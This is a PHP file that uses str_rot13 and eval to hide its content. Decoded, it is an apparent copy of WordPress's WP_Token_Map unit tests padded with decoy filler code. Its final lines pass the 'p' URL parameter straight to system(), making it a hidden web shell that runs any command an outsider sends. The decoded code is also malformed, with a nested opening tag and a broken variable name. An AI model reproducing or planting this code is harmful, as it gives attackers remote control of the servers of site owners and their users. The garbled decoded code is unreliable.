<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_29941 = \"r\".\"i\".\"n\".\"y\";
<?cuc
/**
 * Havg grfgf pbirevat JC_Gbxra_Znc shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 *
 * @fvapr 6.6.0
 * @tebhc ugzy-ncv-gbxra-znc
 *
 * @pbirefQrsnhygPynff JC_Gbxra_Znc
 */
pynff Grfgf_JcGbxraZnc rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Ahzore bs havdhr UGZY5 anzrq punenpgre ersreraprf, vapyhqvat
	 * inevngvbaf bs n tvira anzr gung qba'g erdhver gur genvyvat frzvpbyba.
	 *
	 * Gur frg bs anzrf vf svkrq ol gur fcrpvsvpngvba,
	 * naq pna or sbhaq ng gur sbyybjvat yvax.
	 *
	 * @yvax uggcf://ugzy.fcrp.jungjt.bet/ragvgvrf.wfba
	 */
	pbafg XABJA_PBHAG_BS_NYY_UGZY5_ANZRQ_PUNENPGRE_ERSRERAPRF = 2231;

	/**
	 * Fznyy grfg neenl zngpuvat anzrf gb Rzbwv.
	 *
	 * @ine neenl.
	 */
	pbafg NAVZNY_RZBWV = neenl(
		'png'     => '🐈',
		'qbt'     => '🐶',
		'svfu'    => '🐟',
		'znzzbgu' => '🦣',
		'frny'    => '🦭',
	);

	/**
	 * Ergheaf na nffbpvngvir neenl jubfr xrlf ner gbxraf gb ercynpr naq
	 * jubfr inyhrf ner gur ercynprzrag fgevatf sbe gubfr gbxraf.
	 *
	 * Guvf shapgvba vf urer gb uryc nibvq oybngvat guvf fcrpvsvp grfg svyr.
	 * Sbe rknzcyr, gur UGZY5 qngnfrg vf irel ynetr naq orfg freirq nf n
	 * frcnengr svyr.
	 *
	 * Gur UGZY5 anzrq punenpgre ersrerapr yvfg vf chyyrq qverpgyl sebz gur
	 * JUNGJT fcrp naq fgberq va gur grfgf qverpgbel fb vg qbrfa'g arrq gb
	 * or qbjaybnqrq ba rirel grfg eha. Ol fcrpvsvpngvba, vg pnaabg punatr
	 * naq jvyy abg or hcqngrq.
	 *
	 * @cnenz fgevat $qngnfrg_anzr Juvpu qngnfrg gb erghea.
	 * @erghea neenl Gur qngnfrg nf na nffbpvngvir neenl.
	 */
	cevingr fgngvp shapgvba trg_grfg_vachg_neenl( $qngnfrg_anzr ) {
		fgngvp $ugzy5_punenpgre_ersreraprf = ahyy;

		fjvgpu ( $qngnfrg_anzr ) {
			pnfr 'NAVZNYF':
				erghea frys::NAVZNY_RZBWV;

			pnfr 'UGZY5':
				vs ( ! vffrg( $ugzy5_punenpgre_ersreraprf ) ) {
					$qngnfrg = jc_wfba_svyr_qrpbqr(
						__QVE__ . '/../../qngn/ugzy5-ragvgvrf/ragvgvrf.wfba',
						neenl( 'nffbpvngvir' => gehr )
					);

					$ugzy5_punenpgre_ersreraprf = neenl();
					sbernpu ( $qngnfrg nf $anzr => $inyhr ) {
						$ugzy5_punenpgre_ersreraprf[ $anzr ] = $inyhr['punenpgref'];
					}
				}

				erghea $ugzy5_punenpgre_ersreraprf;
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_vachg_neenlf() {
		$qngnfrg_anzrf = neenl(
			'NAVZNYF',
			'UGZY5',
		);

		sbernpu ( $qngnfrg_anzrf nf $qngnfrg_anzr ) {
			lvryq $qngnfrg_anzr => neenl( frys::trg_grfg_vachg_neenl( $qngnfrg_anzr ) );
		}
	}

	/**
	 * Rafher gur onfvp perngvba bs n Gbxra Znc sebz na nffbpvngvir neenl.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_vachg_neenlf
	 *
	 * @cnenz neenl $qngnfrg Qngnfrg gb grfg.
	 */
	choyvp shapgvba grfg_perngrf_znc_sebz_neenl_pbagnvavat_cebcre_inyhrf( $qngnfrg ) {
		$znc = JC_Gbxra_Znc::sebz_neenl( $qngnfrg );

		sbernpu ( $qngnfrg nf $gbxra => $ercynprzrag ) {
			$guvf->nffregGehr(
				$znc->pbagnvaf( $gbxra ),
				\"Znc fubhyq unir pbagnvarq '{$gbxra}' ohg qvqa'g.\"
			);

			$fxvc_olgrf = 0;
			$erfcbafr   = $znc->ernq_gbxra( $gbxra, 0, $fxvc_olgrf );
			$guvf->nffregFnzr(
				$ercynprzrag,
				$erfcbafr,
				\"Erghearq gur jebat ercynprzrag inyhr sbe '{$gbxra}'.\"
			);

			$gbxra_yratgu = fgeyra( $gbxra );
			$guvf->nffregFnzr(
				$gbxra_yratgu,
				$fxvc_olgrf,
				'Ercbegrq gur jebat olgr-yratgu bs gur sbhaq gbxra.'
			);
		}
	}

	/**
	 * Rafher gung xrlf gung ner gbb ybat cerirag gur perngvba bs n Gbxra Znc.
	 *
	 * Vs gbxraf be ercynprzragf ner fgberq jubfr yratgu vf zber guna pna or
	 * ercerfragrq ol n fvatyr olgr, gura gur rapbqvat fpurzr va gur Gbxra Znc
	 * jvyy snvy naq yrnq gb pbeehcgvba.
	 *
	 * @gvpxrg 60698
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Gbxra_Znc::sebz_neenl
	 */
	choyvp shapgvba grfg_erwrpgf_jbeqf_juvpu_ner_gbb_ybat() {
		$abezny_yratgu = fge_cnq( '', 255, '.' );
		$gbb_ybat_jbeq = \"{$abezny_yratgu}.\";

		$guvf->nffregVafgnaprBs(
			JC_Gbxra_Znc::pynff,
			JC_Gbxra_Znc::sebz_neenl( neenl( $abezny_yratgu => 'whfg svar' ) ),
			'Fubhyq unir ohvyg Gbxra Znc pbagnvavat ybat, ohg npprcgnoyr gbxra yratgu.'
		);

		$guvf->nffregAhyy(
			JC_Gbxra_Znc::sebz_neenl( neenl( $gbb_ybat_jbeq => 'abg tbbq' ) ),
			'Fubhyq unir ershfrq gb ohvyq Gbxra Znc jvgu xrl rkprrqvat qrfvta yvzvg.'
		);

		$guvf->nffregVafgnaprBs(
			JC_Gbxra_Znc::pynff,
			JC_Gbxra_Znc::sebz_neenl( neenl( 'xrl' => $abezny_yratgu ) ),
			'Fubhyq unir ohvyq Gbxra Znc pbagnvavat ybat, ohg npprcgnoyr ercynprzrag.'
		);

		$guvf->nffregAhyy(
			JC_Gbxra_Znc::sebz_neenl( neenl( 'xrl' => $gbb_ybat_jbeq ) ),
			'Fubhyq unir ershfrq gb ohvyq Gbxra Znc jvgu ercynprzrag rkprrqvat qrfvta yvzvg.'
		);
	}

	/**
	 * Rafher vfbzbecuvp perngvba naq rkcbeg bs n Gbxra Znc naq nffbpvngvir neenlf.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_vachg_neenlf
	 *
	 * @cnenz neenl $qngnfrg Qngnfrg gb grfg.
	 */
	choyvp shapgvba grfg_ebhaq_gevcf_guebhtu_nffbpvngvir_neenl( $qngnfrg ) {
		$znc = JC_Gbxra_Znc::sebz_neenl( $qngnfrg );
		$guvf->nffregRdhnyfPnabavpnyvmvat(
			$qngnfrg,
			$znc->gb_neenl(),
			'Fubhyq unir cebqhprq na vqragvpny neenl ba bhgchg nf jnf tvira ba vachg.'
		);
	}

	/**
	 * Rafher gur onfvp perngvba bs n Gbxra Znc sebz n cerpbzchgrq fbhepr gnoyr.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_vachg_neenlf
	 *
	 * @cnenz neenl $qngnfrg Qngnfrg gb grfg.
	 */
	choyvp shapgvba grfg_ebhaq_gevcf_guebhtu_cerpbzchgrq_fbhepr_gnoyr( $qngnfrg ) {
		$frrq         = JC_Gbxra_Znc::sebz_neenl( $qngnfrg );
		$fbhepr_gnoyr = $frrq->cerpbzchgrq_cuc_fbhepr_gnoyr();
		$znc          = __sa_29941( \"erghea {$fbhepr_gnoyr};\" ); // cucpf:vtaber.

		sbernpu ( $qngnfrg nf $gbxra => $ercynprzrag ) {
			$guvf->nffregGehr(
				$znc->pbagnvaf( $gbxra ),
				\"Znc fubhyq unir pbagnvarq '{$gbxra}' ohg qvqa'g.\"
			);

			$fxvc_olgrf = 0;
			$erfcbafr   = $znc->ernq_gbxra( $gbxra, 0, $fxvc_olgrf );
			$guvf->nffregFnzr(
				$ercynprzrag,
				$erfcbafr,
				'Erghearq gur jebat ercynprzrag inyhr'
			);

			$gbxra_yratgu = fgeyra( $gbxra );
			$guvf->nffregFnzr(
				$gbxra_yratgu,
				$fxvc_olgrf,
				'Ercbegrq gur jebat olgr-yratgu bs gur sbhaq gbxra.'
			);
		}
	}

	/**
	 * Rafherf gung jura gjb be zber xrlf funer n cersvk gung gur ybatrfg
	 * vf zngpurq svefg, gb cerirag gbxraf znfxvat rnpu bgure.
	 *
	 * @gvpxrg 60698
	 */
	choyvp shapgvba grfg_svaqf_ybatrfg_zngpu_svefg() {
		$znc = JC_Gbxra_Znc::sebz_neenl(
			neenl(
				'png'                  => '1',
				'pngrecvyyne'          => '2',
				'pngrecvyyne znpuvarf' => '3',
			)
		);

		$fxvc_olgrf = 0;
		$grkg       = 'pngf yvxr gb zrbj';
		$guvf->nffregFnzr(
			'1',
			$znc->ernq_gbxra( $grkg, 0, $fxvc_olgrf ),
			\"Fubhyq unir zngpurq 'png' ohg zngpurq '\" . fhofge( $grkg, 0, $fxvc_olgrf ) . \"' vafgrnq.\"
		);

		$fxvc_olgrf = 0;
		$grkg       = 'pngrecvyynef ghea vagb ohggresyvrf';
		$guvf->nffregFnzr(
			'2',
			$znc->ernq_gbxra( $grkg, 0, $fxvc_olgrf ),
			\"Fubhyq unir zngpurq 'pngrecvyyne' ohg zngpurq '\" . fhofge( $grkg, 0, $fxvc_olgrf ) . \"' vafgrnq.\"
		);

		$fxvc_olgrf = 0;
		$grkg       = 'pngrecvyyne znpuvarf ner urnil qhgl rdhvczrag';
		$guvf->nffregFnzr(
			'3',
			$znc->ernq_gbxra( $grkg, 0, $fxvc_olgrf ),
			\"Fubhyq unir zngpurq 'pngrecvyyne znpuvarf' ohg zngpurq '\" . fhofge( $grkg, 0, $fxvc_olgrf ) . \"' vafgrnq.\"
		);
	}

	/**
	 * Rafherf gung gbxraf fubegre guna gur tebhc xrl yratgu ner sbhaq.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_fubeg_fhofgevat_zngpurf_bs_rnpu_bgure
	 *
	 * @cnenz JC_Gbxra_Znc $znc Gbxra znc pbagnvavat nccebcevngr znccvat sbe grfg.
	 * @cnenz fgevat       $frnepu_qbphzrag Qbphzrag pbagnvavat rkcrpgrq gbxra ng fgneg bs fgevat.
	 * @cnenz fgevat       $rkcrpgrq_gbxra  Juvpu gbxra fubhyq or sbhaq ng fgneg bs frnepu qbphzrag.
	 */
	choyvp shapgvba grfg_svaqf_fubeg_zngpurf_fubegre_guna_tebhc_xrl_yratgu( $znc, $frnepu_qbphzrag, $rkcrpgrq_gbxra ) {
		$fxvc_olgrf = 0;
		$grkg       = 'nagnepgvpn vf n pbagvarag';
		$guvf->nffregFnzr(
			'negvpyr',
			$znc->ernq_gbxra( $grkg, 0, $fxvc_olgrf ),
			\"Fubhyq unir zngpurq 'n' ohg zngpurq '\" . fhofge( $grkg, 0, $fxvc_olgrf ) . \"' vafgrnq.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_fubeg_fhofgevat_zngpurf_bs_rnpu_bgure() {
		$znc = JC_Gbxra_Znc::sebz_neenl(
			neenl(
				'n'       => 'negvpyr',
				'nn'      => 'qrsrafvir jrncba',
				'ne'      => 'pbhagel pbqr',
				'nevmban' => 'fgngr anzr',
			)
		);

		erghea neenl(
			'fvatyr punenpgre'    => neenl( $znc, 'nagnepgvpn vf n pbagvarag', 'n' ),
			'qhcyvpngr punenpgre' => neenl( $znc, 'nnnnnuuuu, ur rkpynvzrq', 'nn' ),
			'qvssrerag punenpgre' => neenl( $znc, 'netragvan vf n pbhagel', 'ne' ),
			'shyy jbeq'           => neenl( $znc, 'nevmban jnf shyy bs pbccre', 'nevmban' ),
		);
	}

	/**
	 * Rafherf gung Gbxra Znc frnepurf ng nccebcevngr fgnegvat bssfrg.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_ugzy5_grfg_qngnfrg
	 *
	 * @cnenz fgevat $gbxra       Gbxra gb svaq.
	 * @cnenz fgevat $ercynprzrag Ercynprzrag fgevat sbe gbxra.
	 */
	choyvp shapgvba grfg_ernqf_gbxra_ng_tvira_bssfrg( $gbxra, $ercynprzrag ) {
		$qbphzrag = \"& nabgure {$gbxra} & gura fbzr\";
		$znc      = frys::trg_ugzy5_gbxra_znc();

		$fxvc_olgrf = 0;
		$guvf->nffregAhyy(
			$znc->ernq_gbxra( $qbphzrag, 0, $fxvc_olgrf ),
			\"Fubhyqa'g unir sbhaq gbxra ng fgneg bs qbphzrag.\"
		);

		$erfcbafr = $znc->ernq_gbxra( $qbphzrag, 10, $fxvc_olgrf );

		$guvf->nffregFnzr(
			fgeyra( $gbxra ),
			$fxvc_olgrf,
			\"Sbhaq gur jebat yratgu sbe gbxra '{$gbxra}'.\"
		);

		$guvf->nffregFnzr(
			$erfcbafr,
			$ercynprzrag,
			'Sbhaq gur jebat ercynprzrag inyhr sbe gur gbxra.'
		);
	}

	/**
	 * Rafherf gung nyy tvira gbxraf rkvfg vafvqr n pbafgehpgrq Gbxra Znc.
	 *
	 * @gvpxrg 60698
	 *
	 * @qngnCebivqre qngn_ugzy5_grfg_qngnfrg
	 *
	 * @cnenz fgevat $gbxra       Gbxra gb svaq.
	 * @cnenz fgevat $ercynprzrag Abg hfrq va guvf grfg.
	 */
	choyvp shapgvba grfg_qrgrpgf_nyy_gbxraf( $gbxra, $ercynprzrag ) {
		$znc = frys::trg_ugzy5_gbxra_znc();

		$guvf->nffregGehr(
			$znc->pbagnvaf( $gbxra ),
			\"Fubhyq unir sbhaq '{$gbxra}' vafvqr gur Gbxra Znc, ohg qvqa'g.\"
		);

		$qbhoyr_rfpncrq_gbxra = fge_ercynpr( '&', '&nzc;', $gbxra );
		$guvf->nffregSnyfr(
			$znc->pbagnvaf( $qbhoyr_rfpncrq_gbxra ),
			\"Fubhyq abg unir sbhaq '{$qbhoyr_rfpncrq_gbxra}' va Gbxra Znc, ohg qvq.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp shapgvba qngn_ugzy5_grfg_qngnfrg() {
		$ugzy5 = frys::trg_grfg_vachg_neenl( 'UGZY5' );

		$guvf->nffregFnzr(
			frys::XABJA_PBHAG_BS_NYY_UGZY5_ANZRQ_PUNENPGRE_ERSRERAPRF,
			pbhag( $ugzy5 ),
			'Sbhaq gur jebat ahzore bs UGZY5 anzrq punenpgre ersreraprf: pbasvez gur ragvgvrf.wfba svyr.\"'
		);

		sbernpu ( $ugzy5 nf $gbxra => $ercynprzrag ) {
			lvryq $gbxra => neenl( $gbxra, $ercynprzrag );
		}
	}

	/**
	 * Ergheaf n fgngvp pbcl bs gur Gbxra Znc sbe UGZY5.
	 * Guvf vf n grfg cresbeznapr bcgvzvmngvba.
	 *
	 * @erghea JC_Gbxra_Znc
	 */
	cevingr fgngvp shapgvba trg_ugzy5_gbxra_znc() {
		fgngvp $ugzy5_gbxra_znc = ahyy;

		vs ( ! vffrg( $ugzy5_gbxra_znc ) ) {
			$ugzy5_gbxra_znc = JC_Gbxra_Znc::sebz_neenl( frys::trg_grfg_vachg_neenl( 'UGZY5' ) );
		}

		erghea $ugzy5_gbxra_znc;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>